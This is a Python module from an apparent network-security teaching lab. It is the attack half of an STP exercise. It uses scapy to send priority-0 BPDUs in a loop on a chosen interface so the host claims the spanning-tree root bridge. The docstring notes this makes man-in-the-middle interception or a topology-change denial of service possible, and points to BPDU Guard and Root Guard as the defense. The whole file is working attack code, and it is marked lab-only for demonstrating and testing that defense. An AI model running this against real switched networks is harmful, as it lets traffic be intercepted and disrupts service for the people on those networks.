# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Chris <goabonga@pm.me>

"""Attack side of netlab-stp: claim the STP root bridge. LAB ONLY.

Emits a superior BPDU (priority 0) so every bridge reconverges its spanning
tree through the attacker - a MITM or DoS via topology change. BPDU Guard /
Root Guard (see bpdu.py) contain this.
"""

from __future__ import annotations

import argparse
import time

from netlab_core import verdict
from netlab_core.sniffing import load_scapy


def run(args: argparse.Namespace) -> int:
    s = load_scapy()
    mac = s.get_if_hwaddr(args.iface)
    bpdu = (
        s.Dot3(dst="01:80:c2:00:00:00", src=mac)
        / s.LLC(dsap=0x42, ssap=0x42, ctrl=3)
        / s.STP(rootid=args.priority, bridgeid=args.priority, rootmac=mac, bridgemac=mac)
    )
    print(f"[*] claiming STP root (priority {args.priority}) on {args.iface}. Ctrl-C to stop.")
    try:
        while True:
            s.sendp(bpdu, iface=args.iface, verbose=0)
            verdict("ALERT", f"superior BPDU sent (priority {args.priority})")
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print("\n[*] stopped.")
    return 0
